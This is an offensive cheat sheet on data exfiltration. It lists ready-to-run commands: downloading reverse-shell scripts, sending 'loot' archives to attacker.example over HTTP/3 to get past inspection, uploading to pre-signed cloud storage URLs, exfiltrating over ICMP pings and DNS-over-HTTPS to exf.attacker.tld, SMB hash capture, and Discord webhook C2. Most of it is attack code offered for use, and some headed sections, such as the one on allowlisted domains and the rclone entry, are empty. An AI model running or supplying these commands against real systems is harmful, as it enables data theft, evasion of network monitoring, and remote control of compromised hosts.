# 🔓 Exfiltration Cheat Sheet: Techniques, Tools & Living Off the Land

## Pre-Engagement: Identify Allowlisted Domains
Before attempting exfiltration, check for commonly trusted domains that can be abused for C2 or data smuggling:
## Encoding & Obfuscation

### Copy/Paste Base64
**Linux**
```bash
base64 -w0 <file>        # Encode (single line)
base64 -d file 
```

**Windows**
```bash
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```

##  HTTP/HTTPS Transfers (Egress)

### Linux Download Utilities
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py # FreeBSD
```
### Windows Download Utilities

**Certutil & Bitsadmin:**
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer job /priority high http://example.com/file.pdf C:\Windows\Temp\file.pdf
```

**PowerShell:**
```powershell
# WebClient
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2/tool.exe","C:\Windows\Temp\tool.exe")
# BitsTransfer
Start-BitsTransfer -Source "http://10.10.14.2/tool.exe" -Destination "C:\Windows\Temp\tool.exe"
```

### HTTP/3 & QUIC (Bypass TCP/443 Inspection)

If egress rules inspect TCP/443 but allow UDP/443, force HTTP/3:
```bash
# Strict QUIC only
curl --http3-only -T loot.7z https://attacker.example/upload
# Ops: Ensure server advertises Alt-Svc: h3
```

### Pre-Signed Object Storage Uploads

Blend into normal cloud traffic using signed URLs (no SDK required):
```bash
# AWS S3
curl -X PUT -T loot.7z "https://bucket.s3.amazonaws.com/loot.7z?<presigned>"
# Azure Blob SAS
curl -X PUT --data-binary @loot.7z -H "x-ms-blob-type: BlockBlob" "https://acct.blob.core.windows.net/container/loot.7z?<sas>"
```

## Quick File Hosting (Exfil Servers)

|Tool|Command / Notes|
|---|---|
|**Python Upload**|`python3 -m uploadserver`  <br>`curl -X POST http://HOST/upload -F 'files=@file.txt'`|
|**goshs** (Swiss Army)|`goshs -s -ss` (HTTPS)  <br>`goshs -smb -smb-domain CORP` (SMB + Hash Capture)  <br>`goshs -dns -dns-ip 10.10.10.10` (DNS Callback)|
|**Simple HTTPS**|`openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes`  <br>Use provided Python2/3 or Flask snippets to host.|
## File Transfer Protocols (FTP/SMB/SCP)

### FTP

- **Server (Python):** `python3 -m pyftpdlib -p 21`
- **Windows Client:** Script an FTP text file and execute: `ftp -n -v -s:ftp.txt`

```bash
open 10.11.0.41 21
USER anonymous
anonymous
bin
GET file.exe
bye
```

### SMB

- **Attacker (Impacket):** `impacket-smbserver -smb2support -user test -password test share /path`
    
- **Victim (Windows):** `net use z: \\10.10.14.14\share /user:test test`
    

### SCP / SSHFS

- **SSHFS (Mount remote):** `sshfs user@<victim_ip>:/path /mnt/sshfs`
    

### TFTP (Legacy)

- **Attacker:** `ptftpd -p 69 eth0 .`
    
- **Victim:** `tftp -i <KALI-IP> get nc.exe`
    

---

## Covert & Alternative Channels

### ICMP Exfiltration
```bash
# Send data via ping
xxd -p -c 4 /path/file | while read line; do ping -c 1 -p $line <IP>; done
```

### DNS over HTTPS (DoH)

Bypass legacy DNS monitoring by wrapping exfil in HTTPS to a trusted resolver:
```bash
# Encode file -> Base32 -> Split -> Send via DoH
cat /tmp/loot.bin | base32 | fold -w32 | while read line; do
  curl "https://dns.google/resolve?name=${line}.exf.attacker.tld&type=TXT"
done
```

### Webhook C2 / Exfil (Discord/Slack/Teams)
Abuse trusted collaboration platforms via write-only webhooks. No API keys required.

- **Discord Example (PowerShell):** Loop beaconing, directory recon, and file upload to `https://discord.com/api/webhooks/...`
    

### Rclone (Cloud Sync)
Encrypt and sync data to cloud storage, blending in with backup traffic:
